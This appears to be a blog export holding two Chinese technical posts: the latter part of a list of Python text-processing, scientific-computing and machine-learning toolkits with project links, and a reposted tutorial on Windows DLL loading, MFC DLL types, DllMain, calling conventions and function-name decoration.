both），同时提供了很多文本处理功能的接口，包括词性标注，名词短语提取，情感分析，文本分类，拼写检查等，甚至包括翻译和语言检测，不过这个是基于Google的API的，有调用次数限制。TextBlob相对比较年轻，有兴趣的同学可以关注。 官方主页：http://textblob.readthedocs.org/en/dev/ Github代码页：https://github.com/sloria/textblob 4. MBSP for Python MBSP is a text analysis system based on the TiMBL and MBT memory based learning applications developed at CLiPS and ILK. It provides tools for Tokenization and Sentence Splitting, Part of Speech Tagging, Chunking, Lemmatization, Relation Finding and Prepositional Phrase Attachment. MBSP与Pattern同源，同出自比利时安特卫普大学CLiPS实验室，提供了Word Tokenization, 句子切分，词性标注，Chunking, Lemmatization，句法分析等基本的文本处理功能，感兴趣的同学可以关注。 官方主页：http://www.clips.ua.ac.be/pages/MBSP 5. Gensim: Topic modeling for humans Gensim是一个相当专业的主题模型Python工具包，无论是代码还是文档，我们曾经用《如何计算两个文档的相似度》介绍过Gensim的安装和使用过程，这里就不多说了。 官方主页：http://radimrehurek.com/gensim/index.html github代码页：https://github.com/piskvorky/gensim 6. langid.py: Stand-alone language identification system 语言检测是一个很有意思的话题，不过相对比较成熟，这方面的解决方案很多，也有很多不错的开源工具包，不过对于Python来说，我使用过langid这个工具包，也非常愿意推荐它。langid目前支持97种语言的检测，提供了很多易用的功能，包括可以启动一个建议的server，通过json调用其API，可定制训练自己的语言检测模型等，可以说是“麻雀虽小，五脏俱全”。 Github主页：https://github.com/saffsd/langid.py 7. Jieba: 结巴中文分词 &quot;结巴&quot;中文分词：做最好的Python中文分词组件 “Jieba” (Chinese for “to stutter”) Chinese text segmentation: built to be the best Python Chinese word segmentation module. 好了，终于可以说一个国内的Python文本处理工具包了：结巴分词，其功能包括支持三种分词模式（精确模式、全模式、搜索引擎模式），支持繁体分词，支持自定义词典等，是目前一个非常不错的Python中文分词解决方案。 Github主页：https://github.com/fxsjy/jieba 8. xTAS xtas, the eXtensible Text Analysis Suite, a distributed text analysis package based on Celery and Elasticsearch. 感谢微博朋友 @大山坡的春 提供的线索：我们组同事之前发布了xTAS，也是基于python的text mining工具包，欢迎使用，链接：http://t.cn/RPbEZOW。看起来很不错的样子，回头试用一下。 Github代码页：https://github.com/NLeSC/xtas 三、Python科学计算工具包 说起科学计算，大家首先想起的是Matlab，集数值计算，可视化工具及交互于一身，不过可惜是一个商业产品。开源方面除了GNU Octave在尝试做一个类似Matlab的工具包外，Python的这几个工具包集合到一起也可以替代Matlab的相应功能：NumPy+SciPy+Matplotlib+iPython。同时，这几个工具包，特别是NumPy和SciPy，也是很多Python文本处理 &amp; 机器学习 &amp; 数据挖掘工具包的基础，非常重要。最后再推荐一个系列《用Python做科学计算》，将会涉及到NumPy, SciPy, Matplotlib，可以做参考。 1. NumPy NumPy is the fundamental package for scientific computing with Python. It contains among other things: 1）a powerful N-dimensional array object 2）sophisticated (broadcasting) functions 3）tools for integrating C/C++ and Fortran code 4） useful linear algebra, Fourier transform, and random number capabilities Besides its obvious scientific uses, NumPy can also be used as an efficient multi-dimensional container of generic data. Arbitrary data-types can be defined. This allows NumPy to seamlessly and speedily integrate with a wide variety of databases. NumPy几乎是一个无法回避的科学计算工具包，最常用的也许是它的N维数组对象，其他还包括一些成熟的函数库，用于整合C/C++和Fortran代码的工具包，线性代数、傅里叶变换和随机数生成函数等。NumPy提供了两种基本的对象：ndarray（N-dimensional array object）和 ufunc（universal function object）。ndarray是存储单一数据类型的多维数组，而ufunc则是能够对数组进行处理的函数。 官方主页：http://www.numpy.org/ 2. SciPy：Scientific Computing Tools for Python SciPy refers to several related but distinct entities: 1）The SciPy Stack, a collection of open source software for scientific computing in Python, and particularly a specified set of core packages. 2）The community of people who use and develop this stack. 3）Several conferences dedicated to scientific computing in Python - SciPy, EuroSciPy and SciPy.in. 4）The SciPy library, one component of the SciPy stack, providing many numerical routines. “SciPy是一个开源的Python算法库和数学工具包，SciPy包含的模块有最优化、线性代数、积分、插值、特殊函数、快速傅里叶变换、信号处理和图像处理、常微分方程求解和其他科学与工程中常用的计算。其功能与软件MATLAB、Scilab和GNU Octave类似。 Numpy和Scipy常常结合着使用，Python大多数机器学习库都依赖于这两个模块。”----引用自“Python机器学习库” 官方主页：http://www.scipy.org/ 3. Matplotlib matplotlib is a python 2D plotting library which produces publication quality figures in a variety of hardcopy formats and interactive environments across platforms. matplotlib can be used in python scripts, the python and ipython shell (ala MATLAB®* or Mathematica®†), web application servers, and six graphical user interface toolkits. matplotlib 是python最著名的绘图库，它提供了一整套和matlab相似的命令API，十分适合交互式地进行制图。而且也可以方便地将它作为绘图控件，嵌入GUI应用程序中。Matplotlib可以配合ipython shell使用，提供不亚于Matlab的绘图体验，总之用过了都说好。 官方主页：http://matplotlib.org/ 4. iPython IPython provides a rich architecture for interactive computing with: 1）Powerful interactive shells (terminal and Qt-based). 2）A browser-based notebook with support for code, text, mathematical expressions, inline plots and other rich media. 3）Support for interactive data visualization and use of GUI toolkits. 4）Flexible, embeddable interpreters to load into your own projects. 5）Easy to use, high performance tools for parallel computing. “iPython 是一个Python 的交互式Shell，比默认的Python Shell 好用得多，功能也更强大。 她支持语法高亮、自动完成、代码调试、对象自省，支持 Bash Shell 命令，内置了许多很有用的功能和函式等，非常容易使用。 ” 启动iPython的时候用这个命令“ipython --pylab”，默认开启了matploblib的绘图交互，用起来很方便。 官方主页：http://ipython.org/ 四、Python 机器学习 &amp; 数据挖掘 工具包 机器学习和数据挖掘这两个概念不太好区分，这里就放到一起了。这方面的开源Python工具包有很多，这里先从熟悉的讲起，再补充其他来源的资料，也欢迎大家补充。 1. scikit-learn: Machine Learning in Python scikit-learn (formerly scikits.learn) is an open source machine learning library for the Python programming language. It features various classification, regression and clustering algorithms including support vector machines, logistic regression, naive Bayes, random forests, gradient boosting, k-means and DBSCAN, and is designed to interoperate with the Python numerical and scientific libraries NumPy and SciPy. 首先推荐大名鼎鼎的scikit-learn，scikit-learn是一个基于NumPy, SciPy, Matplotlib的开源机器学习工具包，主要涵盖分类，回归和聚类算法，例如SVM， 逻辑回归，朴素贝叶斯，随机森林，k-means等算法，代码和文档都非常不错，在许多Python项目中都有应用。例如在我们熟悉的NLTK中，分类器方面就有专门针对scikit-learn的接口，可以调用scikit-learn的分类算法以及训练数据来训练分类器模型。这里推荐一个视频，也是我早期遇到scikit-learn的时候推荐过的：推荐一个Python机器学习工具包Scikit-learn以及相关视频–Tutorial: scikit-learn - Machine Learning in Python 官方主页：http://scikit-learn.org/ 2. Pandas: Python Data Analysis Library Pandas is a software library written for the Python programming language for data manipulation and analysis. In particular, it offers data structures and operations for manipulating numerical tables and time series. 第一次接触Pandas是由于Udacity上的一门数据分析课程“Introduction to Data Science” 的Project需要用Pandas库，所以学习了一下Pandas。Pandas也是基于NumPy和Matplotlib开发的，主要用于数据分析和数据可视化，它的数据结构DataFrame和R语言里的data.frame很像，特别是对于时间序列数据有自己的一套分析机制，非常不错。这里推荐一本书《Python for Data Analysis》，作者是Pandas的主力开发，依次介绍了iPython, NumPy, Pandas里的相关功能，数据可视化，数据清洗和加工，时间数据处理等，案例包括金融股票数据挖掘等，相当不错。 官方主页：http://pandas.pydata.org/ ===================================================================== 分割线，以上工具包基本上都是自己用过的，以下来源于其他同学的线索，特别是《Python机器学习库》，《23个python的机器学习包》，做了一点增删修改，欢迎大家补充 ===================================================================== 3. mlpy - Machine Learning Python mlpy is a Python module for Machine Learning built on top of NumPy/SciPy and the GNU Scientific Libraries. mlpy provides a wide range of state-of-the-art machine learning methods for supervised and unsupervised problems and it is aimed at finding a reasonable compromise among modularity, maintainability, reproducibility, usability and efficiency. mlpy is multiplatform, it works with Python 2 and 3 and it is Open Source, distributed under the GNU General Public License version 3. 官方主页：http://mlpy.sourceforge.net/ 4. MDP：The Modular toolkit for Data Processing Modular toolkit for Data Processing (MDP) is a Python data processing framework. From the user’s perspective, MDP is a collection of supervised and unsupervised learning algorithms and other data processing units that can be combined into data processing sequences and more complex feed-forward network architectures. From the scientific developer’s perspective, MDP is a modular framework, which can easily be expanded. The implementation of new algorithms is easy and intuitive. The new implemented units are then automatically integrated with the rest of the library. The base of available algorithms is steadily increasing and includes signal processing methods (Principal Component Analysis, Independent Component Analysis, Slow Feature Analysis), manifold learning methods ([Hessian] Locally Linear Embedding), several classifiers, probabilistic methods (Factor Analysis, RBM), data pre-processing methods, and many others. “MDP用于数据处理的模块化工具包，一个Python数据处理框架。 从用户的观点，MDP是能够被整合到数据处理序列和更复杂的前馈网络结构的一批监督学习和非监督学习算法和其他数据处理单元。计算依照速度和内存需求而高效的执行。从科学开发者的观点，MDP是一个模块框架，它能够被容易地扩展。新算法的实现是容易且直观的。新实现的单元然后被自动地与程序库的其余部件进行整合。MDP在神经科学的理论研究背景下被编写，但是它已经被设计为在使用可训练数据处理算法的任何情况中都是有用的。其站在用户一边的简单性，各种不同的随时可用的算法，及应用单元的可重用性，使得它也是一个有用的教学工具。” 官方主页：http://mdp-toolkit.sourceforge.net/ 5. PyBrain PyBrain is a modular Machine Learning Library for Python. Its goal is to offer flexible, easy-to-use yet still powerful algorithms for Machine Learning Tasks and a variety of predefined environments to test and compare your algorithms. PyBrain is short for Python-Based Reinforcement Learning, Artificial Intelligence and Neural Network Library. In fact, we came up with the name first and later reverse-engineered this quite descriptive “Backronym”. “PyBrain(Python-Based Reinforcement Learning, Artificial Intelligence and Neural Network)是Python的一个机器学习模块，它的目标是为机器学习任务提供灵活、易应、强大的机器学习算法。（这名字很霸气） PyBrain正如其名，包括神经网络、强化学习(及二者结合)、无监督学习、进化算法。因为目前的许多问题需要处理连续态和行为空间，必须使用函数逼近(如神经网络)以应对高维数据。PyBrain以神经网络为核心，所有的训练方法都以神经网络为一个实例。” 官方主页：http://www.pybrain.org/ 6. PyML - machine learning in Python PyML is an interactive object oriented framework for machine learning written in Python. PyML focuses on SVMs and other kernel methods. It is supported on Linux and Mac OS X. “PyML是一个Python机器学习工具包，为各分类和回归方法提供灵活的架构。它主要提供特征选择、模型选择、组合分类器、分类评估等功能。” 项目主页：http://pyml.sourceforge.net/ 7. Milk：Machine learning toolkit in Python. Its focus is on supervised classification with several classifiers available: SVMs (based on libsvm), k-NN, random forests, decision trees. It also performs feature selection. These classifiers can be combined in many ways to form different classification systems. “Milk是Python的一个机器学习工具箱，其重点是提供监督分类法与几种有效的分类分析：SVMs(基于libsvm)，K-NN，随机森林经济和决策树。它还可以进行特征选择。这些分类可以在许多方面相结合，形成不同的分类系统。对于无监督学习，它提供K-means和affinity propagation聚类算法。” 官方主页：http://luispedro.org/software/milk http://luispedro.org/software/milk 8. PyMVPA: MultiVariate Pattern Analysis (MVPA) in Python PyMVPA is a Python package intended to ease statistical learning analyses of large datasets. It offers an extensible framework with a high-level interface to a broad range of algorithms for classification, regression, feature selection, data import and export. It is designed to integrate well with related software packages, such as scikit-learn, and MDP. While it is not limited to the neuroimaging domain, it is eminently suited for such datasets. PyMVPA is free software and requires nothing but free-software to run. “PyMVPA(Multivariate Pattern Analysis in Python)是为大数据集提供统计学习分析的Python工具包，它提供了一个灵活可扩展的框架。它提供的功能有分类、回归、特征选择、数据导入导出、可视化等” 官方主页：http://www.pymvpa.org/ 9. Pyrallel - Parallel Data Analytics in Python Experimental project to investigate distributed computation patterns for machine learning and other semi-interactive data analytics tasks. “Pyrallel(Parallel Data Analytics in Python)基于分布式计算模式的机器学习和半交互式的试验项目，可在小型集群上运行” Github代码页：http://github.com/pydata/pyrallel 10. Monte - gradient based learning in Python Monte (python) is a Python framework for building gradient based learning machines, like neural networks, conditional random fields, logistic regression, etc. Monte contains modules (that hold parameters, a cost-function and a gradient-function) and trainers (that can adapt a module’s parameters by minimizing its cost-function on training data). Modules are usually composed of other modules, which can in turn contain other modules, etc. Gradients of decomposable systems like these can be computed with back-propagation. “Monte (machine learning in pure Python)是一个纯Python机器学习库。它可以迅速构建神经网络、条件随机场、逻辑回归等模型，使用inline-C优化，极易使用和扩展。” 官方主页：http://montepython.sourceforge.net 11. Theano Theano is a Python library that allows you to define, optimize, and evaluate mathematical expressions involving multi-dimensional arrays efficiently. Theano features: 1）tight integration with NumPy – Use numpy.ndarray in Theano-compiled functions. 2）transparent use of a GPU – Perform data-intensive calculations up to 140x faster than with CPU.(float32 only) 3）efficient symbolic differentiation – Theano does your derivatives for function with one or many inputs. 4）speed and stability optimizations – Get the right answer for log(1+x) even when x is really tiny. 5）dynamic C code generation – Evaluate expressions faster. 6） extensive unit-testing and self-verification – Detect and diagnose many types of mistake. Theano has been powering large-scale computationally intensive scientific investigations since 2007. But it is also approachable enough to be used in the classroom (IFT6266 at the University of Montreal). “Theano 是一个 Python 库，用来定义、优化和模拟数学表达式计算，用于高效的解决多维数组的计算问题。Theano的特点：紧密集成Numpy；高效的数据密集型GPU计算；高效的符号微分运算；高速和稳定的优化；动态生成c代码；广泛的单元测试和自我验证。自2007年以来，Theano已被广泛应用于科学运算。theano使得构建深度学习模型更加容易，可以快速实现多种模型。PS：Theano，一位希腊美女，Croton最有权势的Milo的女儿，后来成为了毕达哥拉斯的老婆。” 12. Pylearn2 Pylearn2 is a machine learning library. Most of its functionality is built on top of Theano. This means you can write Pylearn2 plugins (new models, algorithms, etc) using mathematical expressions, and theano will optimize and stabilize those expressions for you, and compile them to a backend of your choice (CPU or GPU). “Pylearn2建立在theano上，部分依赖scikit-learn上，目前Pylearn2正处于开发中，将可以处理向量、图像、视频等数据，提供MLP、RBM、SDA等深度学习模型。” 官方主页：http://deeplearning.net/software/pylearn2/ 其他的，欢迎大家补充，这里也会持续更新这篇文章。 注：原创文章，转载请注明出处“我爱自然语言处理”：www.52nlp.cn 本文链接地址：http://www.52nlp.cn/python-网页爬虫-文本处理-科学计算-机器学习-数据挖掘","tags":"python"},{"title":"Dll的基本原理和使用方法","url":"/20240321/dll-de-ji-ben-yuan-li-he-shi-yong-fang-fa/","text":"转载自https://slsup.com/post/54.html 引言 调用方式 MFC中的DLL DLL入口函数 关于约定 关于DLL的函数 模块定义文件(.DEF) DLL程序和调用其输出函数的程序的关系 引言 比较大的应用程序都由很多模块组成，这些模块分别完成相对独立的功能，它们彼此协作来完成整个软件系统的工作。可能存在一些模块的功能较为通用，在构造其它软件系统时仍会被使用。在构造软件系统时，如果将所有模块的源代码都静态编译到整个应用程序EXE文件中，会产生一些问题：一个缺点是增加了应用程序的大小，它会占用更多的磁盘空间，程序运行时也会消耗较大的内存空间，造成系统资源的浪费；另一个缺点是，在编写大的EXE程序时，在每次修改重建时都必须调整编译所有源代码，增加了编译过程的复杂性，也不利于阶段性的单元测试。 Windows系统平台上提供了一种完全不同的较有效的编程和运行环境，你可以将独立的程序模块创建为较小的 DLL(Dynamic Linkable Library)文件，并可对它们单独编译和测试。在运行时，只有当EXE程序确实要调用这些DLL模块的情况下，系统才会将它们装载到内存空间中。这种方式不仅减少了 EXE文件的大小和对内存空间的需求，而且使这些DLL模块可以同时被多个应用程序使用。Windows自己就将一些主要的系统功能以 DLL模块的形式实现。 一般来说，DLL是一种磁盘文件，以.dll、.DRV、.FON、.SYS和许多以.EXE为扩展名的系统文件都可以是DLL。它由全局数据、服务函数和资源组成，在运行时被系统加载到进程的虚拟空间中，成为调用进程的一部分。如果与其它DLL之间没有冲突，该文件通常映射到进程虚拟空间的同一地址上。DLL模块中包含各种导出函数，用于向外界提供服务。DLL可以有自己的数据段，但没有自己的堆栈，使用与调用它的应用程序相同的堆栈模式；一个DLL在内存中只有一个实例；DLL实现了代码封装性；DLL的编制与具体的编程语言及编译器无关。 在Win32环境中，每个进程都复制了自己的读/写全局变量。如果想要与其它进程共享内存，必须使用内存映射文件或者声明一个共享数据段。DLL模块需要的堆栈内存都是从运行进程的堆栈中分配出来的。Windows在加载DLL模块时将进程函数调用与DLL文件的导出函数相匹配。Windows操作系统对 DLL的操作仅仅是把DLL映射到需要它的进程的虚拟地址空间里去。DLL函数中的代码所创建的任何对象（包括变量）都归调用它的线程或进程所有. 调用方式 1、静态调用方式：由编译系统完成对DLL的加载和应用程序结束时DLL卸载的编码（如还有其它程序使用该DLL，则Windows对DLL的应用记录减1，直到所有相关程序都结束对该DLL的使用时才释放它），简单实用，但不够灵活，只能满足一般要求。 隐式的调用：需要把产生动态连接库时产生的.LIB文件加入到应用程序的工程中，想使用DLL中的函数时，只须说明一下。隐式调用不需要调用LoadLibrary()和FreeLibrary()。程序员在建立一个DLL文件时，链接程序会自动生成一个与之对应的 LIB导入文件。该文件包含了每一个DLL导出函数的符号名和可选的标识号，但是并不含有实际的代码。LIB文件作为DLL的替代文件被编译到应用程序项目中。 当程序员通过静态链接方式编译生成应用程序时，应用程序中的调用函数与LIB文件中导出符号相匹配，这些符号或标识号进入到生成的EXE文件中。LIB文件中也包含了对应的DLL文件名（但不是完全的路径名），链接程序将其存储在EXE文件内部。 当应用程序运行过程中需要加载DLL文件时，Windows根据这些信息发现并加载DLL，然后通过符号名或标识号实现对DLL函数的动态链接。所有被应用程序调用的DLL文件都会在应用程序EXE文件加载时被加载在到内存中。可执行程序链接到一个包含DLL输出函数信息的输入库文件(.LIB文件)。操作系统在加载使用可执行程序时加载DLL。可执行程序直接通过函数名调用DLL的输出函数，调用方法和程序内部其他的函数是一样的。 2、动态调用方式：是由编程者用API函数加载和卸载DLL来达到调用DLL的目的，使用上较复杂，但能更加有效地使用内存，是编制大型应用程序时的重要方式。 显式的调用：是指在应用程序中用LoadLibrary或MFC提供的AfxLoadLibrary显式的将自己所做的动态连接库调进来，动态连接库的文件名即是上面两个函数的参数，再用GetProcAddress()获取想要引入的函数。自此，你就可以象使用如同本应用程序自定义的函数一样来调用此引入函数了。在应用程序退出之前，应该用FreeLibrary或MFC提供的AfxFreeLibrary释放动态连接库。直接调用Win32的LoadLibary函数，并指定DLL的路径作为参数。LoadLibary返回HINSTANCE参数，应用程序在调用 GetProcAddress函数时使用这一参数。GetProcAddress函数将符号名或标识号转换为DLL内部的地址。程序员可以决定DLL文件何时加载或不加载，显式链接在运行时决定加载哪个DLL文件。使用DLL的程序在使用之前必须加载（LoadLibrary）加载DLL从而得到一个 DLL模块的句柄，然后调用GetProcAddress函数得到输出函数的指针，在退出之前必须卸载DLL(FreeLibrary)。 Windows将遵循下面的搜索顺序来定位DLL： 1．包含EXE文件的目录 2．进程的当前工作目录 3．Windows系统目录 4．Windows目录 5．列在Path环境变量中的一系列目录 MFC中的DLL a、Non-MFC DLL:指的是不用MFC的类库结构，直接用C语言写的DLL，其输出的函数一般用的是标准C接口，并能被非MFC或MFC编写的应用程序所调用。 b、Regular DLL:和下述的Extension DLLs一样，是用MFC类库编写的。明显的特点是在源文件里有一个继承CWinApp的类。其又可细分成静态连接到MFC和动态连接到MFC上的。 静态连接到MFC的动态连接库只被VC的专业般和企业版所支持。该类DLL应用程序里头的输出函数可以被任意Win32程序使用，包括使用MFC的应用程序。输入函数有如下形式： extern “C” EXPORT YourExportedFunction( ); 如果没有extern &quot;C&quot;修饰，输出函数仅仅能从C++代码中调用。 DLL应用程序从CWinApp派生，但没有消息循环。 动态链接到MFC的规则DLL应用程序里头的输出函数可以被任意Win32程序使用，包括使用MFC的应用程序。但是，所有从DLL输出的函数应该以如下语句开始： AFX_MANAGE_STATE(AfxGetStaticModuleState( )) 此语句用来正确地切换MFC模块状态。 Regular DLL能够被所有支持DLL技术的语言所编写的应用程序所调用。在这种动态连接库中，它必须有一个从CWinApp继承下来的类，DLLMain函数被MFC所提供，不用自己显式的写出来。 c、Extension DLL:用来实现从MFC所继承下来的类的重新利用，也就是说，用这种类型的动态连接库，可以用来输出一个从MFC所继承下来的类。它输出的函数仅可以被使用MFC且动态链接到MFC的应用程序使用。可以从 MFC继承你所想要的、更适于你自己用的类，并把它提供给你的应用程序。你也可随意的给你的应用程序提供MFC或MFC继承类的对象指针。 Extension DLL使用MFC的动态连接版本所创建的，并且它只被用MFC类库所编写的应用程序所调用。Extension DLLs 和Regular DLLs不一样，它没有一个从CWinApp继承而来的类的对象，所以，你必须为自己DLLMain函数添加初始化代码和结束代码。 和规则DLL相比，有以下不同： 1、它没有一个从CWinApp派生的对象； 2、它必须有一个DLLMain函数； 3、DLLMain调用AfxInitExtensionModule函数，必须检查该函数的返回值，如果返回0，DLLMmain也返回0； 4、如果它希望输出CRuntimeClass类型的对象或者资源(Resources)，则需要提供一个初始化函数来创建一个CDynLinkLibrary对象。并且，有必要把初始化函数输出； 5、使用扩展DLL的MFC应用程序必须有一个从CWinApp派生的类，而且，一般在InitInstance里调用扩展DLL的初始化函数。 DLL入口函数 1、每一个DLL必须有一个入口点，DLLMain是一个缺省的入口函数。DLLMain负责初始化(Initialization)和结束(Termination) 工作，每当一个新的进程或者该进程的新的线程访问DLL时，或者访问DLL的每一个进程或者线程不再使用DLL或者结束时，都会调用DLLMain。但是，使用TerminateProcess或TerminateThread结束进程或者线程，不会调用DLLMain。 DLLMain的函数原型： BOOL APIENTRY DLLMain(HANDLE hModule,DWORD ul_reason_for_call,LPVOID lpReserved) { switch(ul_reason_for_call) { case DLL_PROCESS_ATTACH: … case DLL_THREAD_ATTACH: … case DLL_THREAD_DETACH: … case DLL_PROCESS_DETACH: … return TRUE; } } 参数： hMoudle：是动态库被调用时所传递来的一个指向自己的句柄(实际上，它是指向_DGROUP段的一个选择符)； ul_reason_for_call：是一个说明动态库被调原因的标志。当进程或线程装入或卸载动态连接库的时候，操作系统调用入口函数，并说明动态连接库被调用的原因。它所有的可能值为： DLL_PROCESS_ATTACH: 进程被调用； DLL_THREAD_ATTACH: 线程被调用； DLL_PROCESS_DETACH: 进程被停止； DLL_THREAD_DETACH: 线程被停止； lpReserved：是一个被系统所保留的参数。 2、_DLLMainCRTStartup 为了使用&quot;C&quot;运行库(CRT，C Run time Library)的DLL版本（多线程），一个DLL应用程序必须指定_DLLMainCRTStartup为入口函数，DLL的初始化函数必须是DLLMain。 _DLLMainCRTStartup完成以下任务：当进程或线程捆绑(Attach)到DLL时为&quot;C&quot;运行时的数据(C Runtime Data)分配空间和初始化并且构造全局&quot;C++&quot;对象，当进程或者线程终止使用DLL(Detach)时，清理C Runtime Data并且销毁全局&quot;C++&quot;对象。它还调 用DLLMain和RawDLLMain函数。 RawDLLMain在DLL应用程序动态链接到MFC DLL时被需要，但它是静态的链接到DLL应用程序的。在讲述状态管理时解释其原因。 关于约定 动态库输出函数的约定有两种：调用约定和名字修饰约定。 1)调用约定(Calling convention)：决定函数参数传送时入栈和出栈的顺序，由调用者还是被调用者把参数弹出栈，以及编译器用来识别函数名字的修饰约定。 函数调用约定有多种，这里简单说一下： 1、__stdcall调用约定相当于16位动态库中经常使用的PASCAL调用约定。在32位的VC++5.0 中PASCAL调用约定不再被支持（实际上它已被定义为__stdcall。除了__pascal外，__fortran和__syscall也不被支持），取而代之的是__stdcall调用约定。两者实质上是一致的，即函数的参数自右向左通过栈传递，被调用的函数在返回前清理传送参数的内存栈，但不同的是函数名的修饰部分（关于函数名的修饰部分在后面将详细说明）。 _stdcall是Pascal程序的缺省调用方式，通常用于Win32 Api中，函数采用从右到左的压栈方式，自己在退出时清空堆栈。VC将函数编译后会在函数名前面加上下划线前缀，在函数名后加上&quot;@&quot;和参数的字节数。 2、C调用约定（即用__cdecl关键字说明）按从右至左的顺序压参数入栈，由调用者把参数弹出栈。对于传送参数的内存栈是由调用者来维护的（正因为如此，实现可变参数的函数只能使用该调用约定）。另外，在函数名修饰约定方面也有所不同。 _cdecl是C和C＋＋程序的缺省调用方式。每一个调用它的函数都包含清空堆栈的代码，所以产生的可执行文件大小会比调用_stdcall函数的大。函数采用从右到左的压栈方式。VC将函数编译后会在函数名前面加上下划线前缀。是MFC缺省调用约定。 3、__fastcall调用约定是&quot;人&quot;如其名，它的主要特点就是快，因为它是通过寄存器来传送参数的（实际上，它用ECX和EDX传送前两个双字（DWORD）或更小的参数，剩下的参数仍旧自右向左压栈传送，被调用的函数在返回前清理传送参数的内存栈），在函数名修饰约定方面，它和前两者均不同。 _fastcall方式的函数采用寄存器传递参数，VC将函数编译后会在函数名前面加上&quot;@“前缀，在函数名后加上”@&quot;和参数的字节数。 4、thiscall仅仅应用于&quot;C++&quot;成员函数。this指针存放于CX寄存器，参数从右到左压。thiscall不是关键词，因此不能被程序员指定。 5、naked call采用1-4的调用约定时，如果必要的话，进入函数时编译器会产生代码来保存ESI，EDI，EBX，EBP寄存器，退出函数时则产生代码恢复这些寄存器的内容。 naked call不产生这样的代码。naked call不是类型修饰符，故必须和_declspec共同使用。 关键字 __stdcall、__cdecl和__fastcall可以直接加在要输出的函数前，也可以在编译环境的Setting…/C/C++ /Code Generation项选择。当加在输出函数前的关键字与编译环境中的选择不同时，直接加在输出函数前的关键字有效。它们对应的命令行参数分别为/Gz、 /Gd和/Gr。缺省状态为/Gd，即__cdecl。 要完全模仿PASCAL调用约定首先必须使用__stdcall调用约定，至于函数名修饰约定，可以通过其它方法模仿。还有一个值得一提的是WINAPI宏，Windows.h支持该宏，它可以将出函数翻译成适当的调用约定，在WIN32中，它被定义为 __stdcall。使用WINAPI宏可以创建自己的APIs。 2)名字修饰约定 1、修饰名(Decoration name) &quot;C&quot;或者&quot;C++&quot;函数在内部（编译和链接）通过修饰名识别。修饰名是编译器在编译函数定义或者原型时生成的字符串。有些情况下使用函数的修饰名是必要的，如在模块定义文件里头指定输出&quot;C++&quot;重载函数、构造函数、析构函数，又如在汇编代码里调 用&quot;C&quot;&quot;或&quot;C++&quot;函数等。 修饰名由函数名、类名、调用约定、返回类型、参数等共同决定。 2、名字修饰约定随调用约定和编译种类(C或C++)的不同而变化。函数名修饰约定随编译种类和调用约定的不同而不同，下面分别说明。 a、C编译时函数名修饰约定规则： __stdcall调用约定在输出函数名前加上一个下划线前缀，后面加上一个&quot;@&quot;符号和其参数的字节数，格式为_functionname@number。 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，格式为_functionname。 __fastcall调用约定在输出函数名前加上一个&quot;@“符号，后面也是一个”@&quot;符号和其参数的字节数，格式为@functionname@number。 它们均不改变输出函数名中的字符大小写，这和PASCAL调用约定不同，PASCAL约定输出的函数名无任何修饰且全部大写。 b、C++编译时函数名修饰约定规则： __stdcall调用约定： 1、以&quot;?&quot;标识函数名的开始，后跟函数名； 2、函数名后面以&quot;@@YG&quot;标识参数表的开始，后跟参数表； 3、参数表以代号表示： X–void ， D–char， E–unsigned char， F–short， H–int， I–unsigned int， J–long， K–unsigned long， M–float， N–double， _N–bool， … PA–表示指针，后面的代号表明指针类型，如果相同类型的指针连续出现，以&quot;0&quot;代替，一个&quot;0&quot;代表一次重复； 4、参数表的第一项为该函数的返回值类型，其后依次为参数的数据类型,指针标识在其所指数据类型前； 5、参数表后以&quot;@Z&quot;标识整个名字的结束，如果该函数无参数，则以&quot;Z&quot;标识结束。 其格式为&quot;?functionname@@YG*****@Z&quot;或&quot;?functionname@@YG*XZ&quot;，例如 int Test1（char *var1,unsigned long）-----“?Test1@@YGHPADK@Z” void Test2（） -----“?Test2@@YGXXZ” __cdecl调用约定： 规则同上面的_stdcall调用约定，只是参数表的开始标识由上面的&quot;@@YG&quot;变为&quot;@@YA&quot;。 __fastcall调用约定： 规则同上面的_stdcall调用约定，只是参数表的开始标识由上面的&quot;@@YG&quot;变为&quot;@@YI&quot;。 VC对函数的省缺声明是&quot;__cedcl&quot;,将只能被C/C调用. 关于DLL的函数 动态链接库中定义有两种函数：导出函数(export function)和内部函数(internal function)。导出函数可以被其它模块调用，内部函数在定义它们的DLL程序内部使用。 输出函数的方法有以下几种： 1、传统的方法 在模块定义文件的EXPORT部分指定要输入的函数或者变量。语法格式如下： entryname[=internalname] [@ordinal[NONAME]] [DATA] [PRIVATE] 其中： entryname是输出的函数或者数据被引用的名称； internalname同entryname; @ordinal表示在输出表中的顺序号(index)； NONAME仅仅在按顺序号输出时被使用（不使用entryname）； DATA表示输出的是数据项，使用DLL输出数据的程序必须声明该数据项为_declspec(DLLimport)。 上述各项中，只有entryname项是必须的，其他可以省略。 对于&quot;C&quot;函数来说，entryname可以等同于函数名；但是对&quot;C++&quot;函数（成员函数、非成员函数）来说， entryname是修饰名。可以从.map映像文件中得到要输出函数的修饰名，或者使用DUMPBIN /SYMBOLS得到，然后把它们写在.def文件的输出模块。DUMPBIN是VC提供的一个工具。 如果要输出一个&quot;C++&quot;类，则把要输出的数据和成员的修饰名都写入.def模块定义文件。 2、在命令行输出 对链接程序LINK指定/EXPORT命令行参数，输出有关函数。 3、使用MFC提供的修饰符号_declspec(DLLexport) 在要输出的函数、类、数据的声明前加上_declspec(DLLexport)的修饰符，表示输出。__declspec(DLLexport)在C调用约定、C编译情况下可以去掉输出函数名的下划线前缀。extern &quot;C&quot;使得在C中使用C编译方式成为可能。在&quot;C&quot;下定义&quot;C&quot;函数， 需要加extern &quot;C&quot;关键词。用extern &quot;C&quot;来指明该函数使用C编译方式。输出的&quot;C&quot;函数可以从&quot;C&quot;代码里调用。 例如，在一个C++文件中，有如下函数： extern “C” {void __declspec(DLLexport) __cdecl Test(int var);} 其输出函数名为：Test MFC提供了一些宏，就有这样的作用。 AFX_CLASS_IMPORT：__declspec(DLLexport) AFX_API_IMPORT：__declspec(DLLexport) AFX_DATA_IMPORT：__declspec(DLLexport) AFX_CLASS_EXPORT：__declspec(DLLexport) AFX_API_EXPORT：__declspec(DLLexport) AFX_DATA_EXPORT：__declspec(DLLexport) AFX_EXT_CLASS： #ifdef _AFXEXT AFX_CLASS_EXPORT #else AFX_CLASS_IMPORT AFX_EXT_API：#ifdef _AFXEXT AFX_API_EXPORT #else AFX_API_IMPORT AFX_EXT_DATA：#ifdef _AFXEXT AFX_DATA_EXPORT #else AFX_DATA_IMPORT 